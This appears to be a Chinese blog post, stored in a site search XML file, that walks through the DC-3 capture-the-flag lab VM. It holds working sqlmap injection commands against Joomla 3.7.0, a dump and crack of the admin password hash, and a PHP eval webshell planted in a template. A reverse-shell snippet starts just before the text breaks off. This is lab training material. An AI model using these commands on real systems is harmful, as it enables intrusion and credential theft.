<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2024/07/24/DC-3/"/>
    <url>/2024/07/24/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>首先，必须先确定测试机器（kali）和目标靶机处于同一个模式（这里使用NAT模式）。否则在kali端扫不出目标靶机的IP地址。</p><p>- </p><p>此外，在本次在虚拟机打开靶机的过程中，遇到了一个问题：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701215940440.png" alt="image-20240701215940440"></p><p>解决方法（亲测有用）：将CD&#x2F;DVD（IDE）选项的<code>IDE（D）</code>修改为<code>IDE 0：0</code>。</p><p><a href="https://developer.aliyun.com/article/1209515">https://developer.aliyun.com/article/1209515</a></p><p>- </p><p>然后通过开关靶机以及进行nmap网段扫描来确定靶机的IP地址。</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222633001.png" alt="image-20240701222633001"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222702232.png" alt="image-20240701222702232"></p><p>通过前后nmap扫描结果的对比，可以确认目标靶机的IP地址是：<code>192.168.204.132</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="开放端口扫描"><a href="#开放端口扫描" class="headerlink" title="开放端口扫描"></a>开放端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.132<br>nmap -sT -p- 192.168.204.132<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701224802419.png" alt="image-20240701224802419"></p><p>由检测结果可以看出，目标靶机开放的端口服务只有<code>80</code>端口（http协议）。接下来进行更加详细的端口扫描。</p><h3 id="详细端口扫描"><a href="#详细端口扫描" class="headerlink" title="详细端口扫描"></a>详细端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701230223132.png" alt="image-20240701230223132"></p><p>可以看到，其开放的80端口服务有http网页相关内容的信息。但除此之外没有其它有用的信息了。所以我们可以再进行nmap漏扫，尝试获取更多有价值的信息。</p><h3 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110519853.png" alt="image-20240702110519853"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110540612.png" alt="image-20240702110540612"></p><p>发现可能这个目标靶机网页可能存在着：</p><p><code>Joomla 中的SQL注入漏洞</code>：(SQL Injection Vulnerability)</p><blockquote><p> An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute aribitrary SQL commands via unspecified vectors.</p><p> 在Joomla中存在一个SQL注入漏洞，3.7版本在3.7.1之前它允许攻击者使用未指明的变量去执行任意SQL命令。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111339383.png" alt="image-20240702111339383"></p><p><code>DOS攻击漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111629174.png" alt="image-20240702111629174"></p><p><code>csrf漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110758621.png" alt="image-20240702110758621"></p><p>扫描结果列举了可能存在csrf漏洞的目录：</p><blockquote><p>&#x2F;index.php</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;remind.remind&amp;Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;reset.request&amp;Itemid&#x3D;101</p></blockquote><table><thead><tr><th align="left">csrf漏洞：CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</th></tr></thead></table><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><h3 id="访问目标靶机"><a href="#访问目标靶机" class="headerlink" title="访问目标靶机"></a>访问目标靶机</h3><p>在浏览器访问目标靶机的IP地址<code>192.168.204.132</code></p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702104858844.png" alt="image-20240702104858844"></p><p>其中的提示信息为：</p><blockquote><p>This time, there is only one flag, one entry point and no clues.</p><p>To get the flag, you’ll obviously have to gain root privileges.</p><p>How you get to be root is up to you - and, obviously, the system.</p><p>Good luck - and I hope you enjoy this little challenge.</p><p>这次只有一个flag，一个入口并且没有提示。为了获取flag，你需要获得root权限。如何获得root权限取决于你自己，当然，也取决于系统。祝你好运，我希望你能享受这个挑战。</p></blockquote><h3 id="指纹工具识别技术构成"><a href="#指纹工具识别技术构成" class="headerlink" title="指纹工具识别技术构成"></a>指纹工具识别技术构成</h3><p>使用浏览器插件<code>Wappalyzer</code>进行指纹识别，进行网页技术构成识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702113249330.png" alt="image-20240702113249330"></p><p>可以看到，这个网页使用的是<strong>Joomla CMS</strong>框架，Joomia在前面进行nmap漏扫的时候也出现过捏！使用的编程语言是<strong>PHP</strong>，操作系统是<strong>Ubuntu</strong>。</p><h2 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702184616071.png" alt="image-20240702184616071"></p><p>得到的目录信息：</p><blockquote><p> <a href="http://192.168.204.132/media/">http://192.168.204.132/media/</a></p><p> <a href="http://192.168.204.132/templates/">http://192.168.204.132/templates/</a></p><p> <a href="http://192.168.204.132/modules/">http://192.168.204.132/modules/</a></p><p> <a href="http://192.168.204.132/images/">http://192.168.204.132/images/</a></p><p> <a href="http://192.168.204.132/bin/">http://192.168.204.132/bin/</a></p><p> <a href="http://192.168.204.132/plugins/">http://192.168.204.132/plugins/</a></p><p> <a href="http://192.168.204.132/includes/">http://192.168.204.132/includes/</a></p><p> <a href="http://192.168.204.132/language/">http://192.168.204.132/language/</a></p><p> <a href="http://192.168.204.132/components/">http://192.168.204.132/components/</a></p><p> <a href="http://192.168.204.132/cache/">http://192.168.204.132/cache/</a></p><p> <a href="http://192.168.204.132/libraries/">http://192.168.204.132/libraries/</a></p><p> <a href="http://192.168.204.132/tmp/">http://192.168.204.132/tmp/</a></p><p> <a href="http://192.168.204.132/layouts/">http://192.168.204.132/layouts/</a></p><p> <a href="http://192.168.204.132/administrator/">http://192.168.204.132/administrator/</a></p><p> <a href="http://192.168.204.132/cli/">http://192.168.204.132/cli/</a></p></blockquote><p>发现了管理员目录，即后台管理系统 <code>http://192.168.204.132/administrator/</code>欸！！</p><p>试着在网页进行访问：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702185113830.png" alt="image-20240702185113830"></p><p>接下来的思路是寻找可通过认证的用户账号，即用户名和密码。</p><h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>使用<code>searchsploit</code>进行漏洞搜索。</p><p>- </p><p>在前面两个靶场中，我们都是使用kali自带的msfconsole来进行漏洞查询，那为什么在这个靶场就要使用searchsploit了呢？searchsploit和msfconsole有什么区别？</p><blockquote><ul><li><p>searchsploit</p><p>功能：用于搜索漏洞利用代码，是一个命令行工具。</p><p>用途：主要用于查找已知漏洞的利用代码。</p></li><li><p>msfconsole</p><p>功能：是metasploit框架的命令行接口，包含了大量的漏洞利用模块。</p><p>用途：主要用于执行漏洞渗透测试活动，包括选择合适的漏洞利用模块，设置payload，执行渗透攻击，获取远程访问权限等。</p></li></ul></blockquote><p>- </p><p>前面 nmap漏扫 以及 后面的 gubuster目录爆破的后台管理界面 已经提示得不能再明显了，是Joomla！所以此处我们直接针对这个漏洞使用searchsploit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla<br></code></pre></td></tr></table></figure><p>找到非常多该漏洞的可利用代码文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191749731.png" alt="image-20240702191749731"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191823709.png" alt="image-20240702191823709"></p><p>根据前面进行nmap漏扫得到的结果显示，目标靶机使用的Joomla版本为3.7.0。因此，我们可以进行更详细的searchsploit搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla 3.7.0<br></code></pre></td></tr></table></figure><p>得到的结果很精炼，可以利用SQL注入以及CSS攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702192127253.png" alt="image-20240702192127253"></p><p>查看其详细信息：</p><p>如何查看<code>php/webapps/42033.txt</code>以及<code>php/webapps/43488.txt</code>代码文件？</p><p>答：使用searchsploit。使用<code>searchsploit -p 42033/43488.txt </code> 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 42033.txt<br>searchsploit -p 43488.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193128571.png" alt="image-20240702193128571"></p><p>在详细信息中，可利用代码文件的路径path被展示出来。</p><ul><li>SQL注入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>  /usr/share/exploitdb/exploits/php/webapps/42033.txt   <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193539768.png" alt="image-20240702193539768"></p><p>可以从中得到该SQL注入漏洞利用的使用方法，利用sqlmap：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><ul><li>CSS攻击</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/43488.txt  <br></code></pre></td></tr></table></figure><blockquote><p>CSS攻击是一种利用浏览器对CSS的解析和应用来实施的安全攻击。通过利用浏览器在渲染网页时对CSS的强大控制能力，通过构造恶意的CSS代码来实现攻击的目的。常见的CSS攻击方式有：CSS注入攻击、CSS选择器攻击、CSS历史攻击、针对特定浏览器漏洞的攻击等等。</p></blockquote><p>有关于该漏洞利用的概要介绍为:</p><blockquote><ol><li>Description（描述）</li></ol><p>Whenever a user edits a message with &lt;\textarea&gt; inside the body, everything after the &lt;\textarea&gt; will be executed in the user’s browser. Works with every version up to 4.0.20</p><p>无论何时用户在正文中使用&lt;\textarea&gt;编辑信息时，&lt;\textarea&gt;时候的任意内容都会在用户的浏览器中被执行。这一特性适用于4.0.20之前的版本。</p><ol start="2"><li>Proof of Concept（概念验证）</li></ol><p>Login with permissions to post a message, insert &lt;\textarea&gt; in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed</p><p>获取相应权限登陆以发布信息，在主体中插入 &lt;\textarea&gt; 并在它后面添加任意html代码，无论何时用户尝试去编辑这些信息，那些被写在 &lt;\textarea&gt; 后面的代码都会被执行。</p><ol start="3"><li>Solution:（解决方案）</li></ol><p>Update to version 4.0.21<br><a href="https://stackideas.com/blog/easydiscuss4021-update">https://stackideas.com/blog/easydiscuss4021-update</a></p><p>将版本更新到4.0.21</p></blockquote><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>意思意思吧，万一有比SQL注入更简便的方法呢？或许直接有用户的数据库呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search Joomla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702200337335.png" alt="image-20240702200337335"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202047792.png" alt="image-20240702202047792"></p><p>可以看到，有关于Joomla的漏洞还挺多！</p><p>在前面的nmap漏扫，以及上面的searchsploit（附带版本号）的查询结果，都提到了SQL注入。</p><p>在上述msfconsole的搜索结果中，在rank等级为<code>excellent</code>，又比较新的漏洞中查找有关于SQL注入的漏洞，并尝试利用它：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202404808.png" alt="image-20240702202404808"></p><p>好！6号漏洞<code>exploit/unix/webapp/joomla_comfields_sqli_rce </code>申请出战！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/joomla_comfields_sqli_rce<br><br>show options<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.204.132<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202620785.png" alt="image-20240702202620785"></p><p>执行<code>run/exploit</code>:<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202723977.png" alt="image-20240702202723977"></p><p>发现均没有 session 被创建，即利用失败！对<code>msfconsole</code>搜索出来的漏洞利用失败，所以我们还是得回去尝试通过<code>searchsploit</code>搜索得到的可利用代码文件以及利用方法了。</p><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>根据上一节<code>searchsploit</code>搜索得到的信息对目标靶机进行sqlmap注入测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>--dbs</code>：指示 sqlmap 列出目标数据库服务器中的所有数据库</p><p>注入结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702203426962.png" alt="image-20240702203426962"></p><p>失败了。。。。。？？？？</p><p>哦！注意！利用文件中给出的利用方法中，给出的URL中的<code>localhost</code>字段需要自己手动修改成目标靶机的IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702204349894.png" alt="image-20240702204349894"></p><p>得到的信息有：</p><blockquote><p>可用的数据库有：</p><p>information_schema<br><strong>joomladb</strong>    <strong>！！！！</strong><br>mysql<br>performance_schema<br>sys</p></blockquote><p>对其中最可能含有有价值信息的joomladb数据库进行进一步的访问，指定列出joomladb数据库的所有表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明目标URL</p><p><code>-D</code>：指定目标数据库的名称</p><p><code>--riks</code>：设置SQL注入的风险级别，数字越高表示尝试更高风险的注入测试。</p><p><code>--level</code>：设置测试的深度级别，数字越高表示尝试更深入的注入测试。</p><p><code>--random-agent</code>该参数使得每次请求都使用一个随机的User-Agent头部，这有助于隐藏 sqlmap 的请求特征，增加匿名性。</p><p><code>--tables</code>：参数指示sqlmap列出目标数据库中的所有表名。</p><p><code>-P list[fullordering]</code>：-p参数指定了用于注入的URL参数名：list[fullordering]这是一个潜在的注入点，sqlmap将尝试利用这个参数进行SQL注入测试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235531424.png" alt="image-20240702235531424"></p><p>一共有76张表table呢！在其中发现了一个名为<code>users</code>的表，尝试访问。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702235648824.png" alt="image-20240702235648824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> --columns -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-T</code>：用于指定目标数据库中的表名。因为数据库名是<code>#__users</code>，但是<code>#</code>在数据库中又表示注释符号，所以需要给给这个字段添加一对双引号，以防止错误解析。</p><p><code>--columns</code>：该参数指示sqlmap列出指定表的所有列。</p><p>在实际的命令运行过程中，会发生有三个需要输入选项的地方，前两个选<code>y</code>之后那个需要选择字典wordlist的地方就什么都不选直接 回车等待结果就好了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150454303.png" alt="image-20240703150454303"></p><p>得到<code>joomladb数据库</code>的表为<code> #__users</code>的<code>列</code>相关信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703150540777.png" alt="image-20240703150540777"></p><p>可以发现其中有名为<code> name 、password、 username</code>的账户信息列。因而我们需要进一步查看这些列的具体信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-string">&quot;#__users&quot;</span> -C name,username,password --dump -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-C </code>：指定要查询的列名，多个列名之间使用逗号进行分隔。</p><p><code>--dump</code>该参数指示sqlmap将从数据库中检索到的数据打印出来。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703151043560.png" alt="image-20240703151043560"></p><p>不难想到这是一个管理员的账号，但是密码显然是经过hash加密后的。因此接下来就是要对这个密码进行碰撞破解或是进行重置，将其修改为自己的密码。</p><blockquote><p>name:admin</p><p>username：admin</p><p>password：</p><p>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu </p></blockquote><ul><li>重置密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152729545.png" alt="image-20240703152729545"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703152857235.png" alt="image-20240703152857235"></p><blockquote><p>.so文件是linux系统中的动态链接库文件，它们通过动态链接的方式在运行时被程序加载。</p></blockquote><p>看了有关于带有<code>hash</code>字样文件的搜索结果，发现其中并没有关于password-hash的加密脚本文件。虽然有几个像的，但是也没有明确显示出就是hash密码加密脚本文件。所以重置密码这个思路可以暂时搁置了。</p><ul><li>碰撞爆破</li></ul><p>使用<code>john</code>工具来实现hash值的碰撞爆破。（kali自带有john）</p><p>首先先将上述获得的管理员密码的hash值保存为<code>user_password_hash.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> user_password_hash.txt<br><br>vim user_password_hash.txt<br><br><span class="hljs-built_in">cat</span> user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154132239.png" alt="image-20240703154132239"></p><p>然后使用john命令进行碰撞爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john user_password_hash.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154228849.png" alt="image-20240703154228849"></p><p>中间标黄的就是碰撞爆破得到的密码：<code>snoopy </code></p><blockquote><p>username：admin</p><p>password：snoopy</p></blockquote><p>ok！尝试去登陆后台管理系统<code>http://192.168.204.132/administrator/</code>！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154538725.png" alt="image-20240703154538725"></p><p>成功！</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>到处看看管理系统，发现在Extensions下的Templates（模板）有Templates模板块</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154807462.png" alt="image-20240703154807462"></p><p>进入该模板块，发现其中一共有两个模板：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703154823270.png" alt="image-20240703154823270"></p><p>点进第一个模板，在左侧目录栏进入<code>index.php</code>文件（正常情况下优先考虑的文件）。</p><blockquote><p>有了PHP文件，就可以考虑各种拿shell的方法，包括但不限于一句话木马。</p><ul><li>一句话木马</li></ul><?php @eval($_POST['shell']);?><p>以 <?php 和 ;?> 分别为开头和结尾，然后使用 @ 符号抑制错误输出，后面接着跟着 一个函数名 用于 执行字符串 作为php代码运行。接着跟一个括号，括号内首先跟一个超全局数组 $_POST ，这里表示获取通过POST方法传递的参数，后面接着一个中括号，括号内为向POST传递的一个（命令）字符串，该（命令）字符串将会被前面的函数执行，就是相当于执行某个命令嘛！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703160840412.png" alt="image-20240703160840412"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703162717989.png" alt="image-20240703162717989"></p><p>在此处设置放入一句话木马🐎（放在最开始吧）：</p><p>注意！这里去头去尾了哦！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703232034778.png" alt="image-20240703232034778"></p><p>点击左上角的“save &amp; close”对文件进行保存。</p><p>对第二个模板进行相同的一句话木马注入操作，以防止上面所注入一句话木马的模板并不是目标靶机后台管理系统所使用的模板，进而导致失败瓶颈。</p><p>然后通过中国蚁剑进行连接。</p><blockquote><p>kali安装中国蚁剑的教程为：</p><p><a href="https://blog.csdn.net/liver100day/article/details/120222378%EF%BC%88kali%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91%EF%BC%89">https://blog.csdn.net/liver100day/article/details/120222378（kali如何安装蚁剑）</a></p></blockquote><p>安装完kali之后，若想在本地物理主机远程连接以及打开中国蚁剑，那么需要启用X11转发选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -X sweet@192.168.204.128<br></code></pre></td></tr></table></figure><p>连接成功后进入到中国蚁剑文件夹中，执行<code>./AntSword</code>命令：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211405701.png" alt="image-20240703211405701"></p><p>发现在本地物理主机上启动失败。粗错误信息表示应用程序在试图连接到X服务器的显示屏，但无法打开显示。根据gpt问答，可知需要启用X11转发选项，但是我已经启用了，还是没能成功显示。</p><p>当然也有可能是DISPLAY环境变量没正确设置，但是再次尝试有点花费时间和力气。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211719844.png" alt="image-20240703211719844"></p><p>去kali虚拟机上尝试启用中国蚁剑（在kali已经成功安装的基础上）。成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703211900066.png" alt="image-20240703211900066"></p><p>右键空白处选择“ADD”添加数据：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213434075.png" alt="image-20240703213434075"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213808540.png" alt="image-20240703213808540"></p><p><code>Shell url</code>:目标靶机的URL地址。</p><p><code>Shell pwd</code>：连接密码，代码参数值，例如 &lt;?php @eval($_POST[‘x’])?;&gt;中的“X”值。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703213828518.png" alt="image-20240703213828518"></p><p>选中所添加的连接，右键选择第一项<code>Ternimal</code>打开终端。如果能正确连接上目标靶机URL的话就会显示如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234428385.png" alt="image-20240703234428385"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>中国蚁剑连接上目标URL之后，模拟的是正常用户访问该URL，只要访问该URL，网页代码就会被启动，一句话木马就会被触发。我们注入的一句话木马要执行的命令是<code>shell</code>提权命令。所以使用上述检测命令检测当前所获得的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240703234524751.png" alt="image-20240703234524751"></p><p>根据结果可以发现，尽管已经拿到了shell，但是目前所拥有的权限还不是root权限。因此，还需要进行进一步的提权操作。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Linux提权总结：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>编写通过prop_open反弹shell的php代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 当系统没有禁用proc_open的时候，我们是可以借助proc_open轻松反弹这样的一个shell的。<br>&lt;?php<br><span 